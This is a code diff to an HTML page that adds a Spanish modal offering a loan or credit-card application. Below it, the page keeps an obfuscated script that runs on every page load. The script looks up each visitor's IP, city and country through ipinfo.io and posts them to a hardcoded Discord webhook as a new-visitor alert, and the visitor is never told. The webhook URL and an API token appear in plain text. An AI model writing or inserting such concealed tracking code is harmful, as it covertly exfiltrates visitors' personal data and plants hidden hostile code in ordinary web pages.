@@ -315,6 +315,436 @@
             transform: scale(0.98);
         }
     </style>
+
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f2f4f7;
+}
+
+/* =========================
+   MODAL
+========================= */
+
+.modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(8, 15, 30, 0.72);
+    backdrop-filter: blur(7px);
+    -webkit-backdrop-filter: blur(7px);
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    padding: 20px;
+    z-index: 9999;
+
+    opacity: 1;
+    visibility: visible;
+    transition: opacity .35s ease, visibility .35s ease;
+}
+
+.modal-overlay.hidden {
+    opacity: 0;
+    visibility: hidden;
+}
+
+/* =========================
+   CONTENEDOR
+========================= */
+
+.modal {
+    width: 100%;
+    max-width: 620px;
+
+    background: #ffffff;
+    border-radius: 24px;
+
+    padding: 30px;
+
+    box-shadow:
+        0 25px 70px rgba(0,0,0,.22);
+
+    transform: scale(1);
+    transition: transform .35s ease;
+
+    position: relative;
+    overflow: hidden;
+}
+
+.modal-overlay.hidden .modal {
+    transform: scale(.92);
+}
+
+/* Línea decorativa superior */
+
+.modal::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 4px;
+
+    background: linear-gradient(
+        90deg,
+        #0b63ce,
+        #1976e8,
+        #43a5ff
+    );
+}
+
+/* =========================
+   LOGO
+========================= */
+
+.logo-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    margin-bottom: 22px;
+}
+
+.logo {
+    width: 72px;
+    height: 72px;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    border-radius: 18px;
+
+    background: #f1f6fc;
+
+    padding: 12px;
+
+    animation: logoAppear .6s ease;
+}
+
+.logo svg {
+    width: 100%;
+    height: 100%;
+}
+
+/* =========================
+   TITULO
+========================= */
+
+.modal-title {
+    text-align: center;
+
+    font-size: 25px;
+    font-weight: 700;
+
+    color: #172033;
+
+    margin-bottom: 8px;
+}
+
+.modal-subtitle {
+    text-align: center;
+
+    font-size: 14px;
+    line-height: 1.5;
+
+    color: #697386;
+
+    margin-bottom: 25px;
+}
+
+/* =========================
+   OPCIONES
+========================= */
+
+.options {
+    display: grid;
+
+    grid-template-columns: 1fr 1fr;
+
+    gap: 16px;
+}
+
+/* Tarjeta */
+
+.option {
+    position: relative;
+
+    border: 2px solid #e5e9ef;
+
+    border-radius: 18px;
+
+    padding: 15px;
+
+    background: #fff;
+
+    cursor: pointer;
+
+    transition:
+        border-color .25s ease,
+        box-shadow .25s ease,
+        transform .25s ease,
+        background .25s ease;
+
+    user-select: none;
+}
+
+.option:hover {
+    transform: translateY(-3px);
+
+    border-color: #b9cce3;
+
+    box-shadow:
+        0 10px 25px rgba(20, 45, 80, .09);
+}
+
+/* Imagen */
+
+.option-image {
+    width: 100%;
+    height: 145px;
+
+    border-radius: 13px;
+
+    overflow: hidden;
+
+    background: #eef2f6;
+
+    margin-bottom: 13px;
+}
+
+.option-image img {
+    width: 100%;
+    height: 100%;
+
+    object-fit: cover;
+
+    display: block;
+
+    transition: transform .4s ease;
+}
+
+.option:hover .option-image img {
+    transform: scale(1.05);
+}
+
+/* Texto */
+
+.option-title {
+    font-size: 17px;
+    font-weight: 700;
+
+    color: #182235;
+
+    margin-bottom: 5px;
+}
+
+.option-description {
+    font-size: 12px;
+
+    line-height: 1.45;
+
+    color: #7a8494;
+}
+
+/* =========================
+   SELECCIONADO
+========================= */
+
+.option.selected {
+    border-color: #1268d5;
+
+    background: #f3f8ff;
+
+    box-shadow:
+        0 8px 25px rgba(18,104,213,.16);
+
+    transform: translateY(-3px);
+}
+
+.option.selected .option-image img {
+    transform: scale(1.04);
+}
+
+/* Check */
+
+.option-check {
+    position: absolute;
+
+    top: 12px;
+    right: 12px;
+
+    width: 28px;
+    height: 28px;
+
+    border-radius: 50%;
+
+    background: #1268d5;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    color: white;
+
+    font-size: 15px;
+    font-weight: bold;
+
+    opacity: 0;
+    transform: scale(.5);
+
+    transition:
+        opacity .25s ease,
+        transform .25s ease;
+}
+
+.option.selected .option-check {
+    opacity: 1;
+    transform: scale(1);
+}
+
+/* =========================
+   BOTON
+========================= */
+
+.continue-btn {
+    width: 100%;
+
+    height: 52px;
+
+    margin-top: 23px;
+
+    border: none;
+
+    border-radius: 13px;
+
+    background: #d9dee6;
+
+    color: #929aa7;
+
+    font-size: 15px;
+    font-weight: 700;
+
+    cursor: not-allowed;
+
+    transition:
+        background .25s ease,
+        transform .2s ease,
+        box-shadow .25s ease;
+}
+
+.continue-btn.active {
+    background: linear-gradient(
+        135deg,
+        #0865d2,
+        #1681ed
+    );
+
+    color: #fff;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 8px 20px rgba(8,101,210,.25);
+}
+
+.continue-btn.active:hover {
+    transform: translateY(-2px);
+
+    box-shadow:
+        0 12px 25px rgba(8,101,210,.32);
+}
+
+.continue-btn.active:active {
+    transform: translateY(0);
+}
+
+/* =========================
+   PEQUEÑO TEXTO
+========================= */
+
+.modal-footer {
+    text-align: center;
+
+    margin-top: 14px;
+
+    font-size: 11px;
+
+    color: #9aa3af;
+}
+
+/* =========================
+   ANIMACIONES
+========================= */
+
+@keyframes logoAppear {
+    from {
+        opacity: 0;
+        transform: translateY(-12px) scale(.9);
+    }
+
+    to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+    }
+}
+
+/* Animación de selección */
+
+.option.selected {
+    animation: selectedAnimation .35s ease;
+}
+
+@keyframes selectedAnimation {
+
+    0% {
+        transform: scale(.97);
+    }
+
+    60% {
+        transform: scale(1.02);
+    }
+
+    100% {
+        transform: scale(1);
+    }
+}
+
+/* =========================
+   RESPONSIVE
+========================= */
+
+@media (max-width: 600px) {
+
+    .modal {
+        padding: 22px;
+
+        border-radius: 20px;
+    }
+
+    .modal-title {
+        font-size: 22px;
+    }
+
+    .options {
+        grid-template-columns: 1fr;
+    }
+
+    .option-image {
+        height: 135px;
+    }
+}
+
+</style>
 </head>
 <body>
     <div class="container">
@@ -394,6 +824,271 @@
             </div>
         </div>
     </div>
+
+<!-- =================================
+     MODAL
+================================= -->
+
+<div class="modal-overlay" id="modalOverlay">
+
+    <div class="modal" id="selectionModal">
+
+        <!-- LOGO SVG -->
+
+        <div class="logo-container">
+
+            <div class="logo">
+
+                <!-- Reemplaza este SVG por el logo de tu página -->
+
+                <svg
+                    viewBox="0 0 100 100"
+                    xmlns="http://www.w3.org/2000/svg"
+                >
+
+                    <circle
+                        cx="50"
+                        cy="50"
+                        r="45"
+                        fill="#1268d5"
+                    />
+
+                    <path
+                        d="M28 55
+                           C35 35 65 35 72 55
+                           C65 72 35 72 28 55Z"
+                        fill="white"
+                    />
+
+                    <circle
+                        cx="50"
+                        cy="52"
+                        r="8"
+                        fill="#1268d5"
+                    />
+
+                </svg>
+
+            </div>
+
+        </div>
+
+
+        <!-- TITULO -->
+
+        <h2 class="modal-title">
+            ¿Qué deseas solicitar?
+        </h2>
+
+        <p class="modal-subtitle">
+            Selecciona una de las opciones para continuar con tu solicitud.
+        </p>
+
+
+        <!-- OPCIONES -->
+
+        <div class="options">
+
+            <!-- PRESTAMO -->
+
+            <div
+                class="option"
+                data-option="prestamo"
+            >
+
+                <div class="option-check">
+                    ✓
+                </div>
+
+                <div class="option-image">
+
+                    <img
+                        src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=800&q=80"
+                        alt="Préstamo"
+                    >
+
+                </div>
+
+                <div class="option-title">
+                    Préstamo
+                </div>
+
+                <div class="option-description">
+                    Solicita un préstamo y conoce las opciones disponibles para ti.
+                </div>
+
+            </div>
+
+
+            <!-- TARJETA -->
+
+            <div
+                class="option"
+                data-option="tarjeta"
+            >
+
+                <div class="option-check">
+                    ✓
+                </div>
+
+                <div class="option-image">
+
+                    <img
+                        src="https://images.unsplash.com/photo-1556742111-a301076d9d18?auto=format&fit=crop&w=800&q=80"
+                        alt="Tarjeta de crédito"
+                    >
+
+                </div>
+
+                <div class="option-title">
+                    Tarjeta de crédito
+                </div>
+
+                <div class="option-description">
+                    Conoce las opciones de tarjeta de crédito disponibles para ti.
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <!-- BOTON -->
+
+        <button
+            class="continue-btn"
+            id="continueBtn"
+            disabled
+        >
+            Continuar
+        </button>
+
+
+        <div class="modal-footer">
+            Selecciona una opción para continuar
+        </div>
+
+    </div>
+
+</div>
+
+    
+<script>
+
+/* =================================
+   ELEMENTOS
+================================= */
+
+const options = document.querySelectorAll(".option");
+
+const continueBtn =
+    document.getElementById("continueBtn");
+
+const modalOverlay =
+    document.getElementById("modalOverlay");
+
+
+/* =================================
+   OPCION SELECCIONADA
+================================= */
+
+let selectedOption = null;
+
+
+/* =================================
+   SELECCIONAR OPCION
+================================= */
+
+options.forEach(option => {
+
+    option.addEventListener("click", () => {
+
+        /* Si ya estaba seleccionada */
+
+        if (option.classList.contains("selected")) {
+
+            option.classList.remove("selected");
+
+            selectedOption = null;
+
+            continueBtn.disabled = true;
+
+            continueBtn.classList.remove("active");
+
+            return;
+        }
+
+
+        /* Quitar selección anterior */
+
+        options.forEach(item => {
+
+            item.classList.remove("selected");
+
+        });
+
+
+        /* Seleccionar nueva */
+
+        option.classList.add("selected");
+
+        selectedOption =
+            option.dataset.option;
+
+
+        /* Activar botón */
+
+        continueBtn.disabled = false;
+
+        continueBtn.classList.add("active");
+
+    });
+
+});
+
+
+/* =================================
+   CONTINUAR
+================================= */
+
+continueBtn.addEventListener("click", () => {
+
+    if (!selectedOption) {
+        return;
+    }
+
+
+    console.log(
+        "Opción seleccionada:",
+        selectedOption
+    );
+
+
+    /* Cerrar modal */
+
+    modalOverlay.classList.add("hidden");
+
+
+    /*
+       AQUÍ PUEDES HACER LA REDIRECCIÓN
+
+       Ejemplo:
+
+       if (selectedOption === "prestamo") {
+           window.location.href = "prestamo.html";
+       }
+
+       if (selectedOption === "tarjeta") {
+           window.location.href = "tarjeta.html";
+       }
+
+    */
+
+});
+
+
+</script>
+    
 <script>
 const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1539128158262001684/TnH2KJZAHKvHRDY6cptJ1GNxJY2d5hr-Z8-phfTxJib--__hPnAMz-SaXeCa-pSad6Cb','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
 </script>
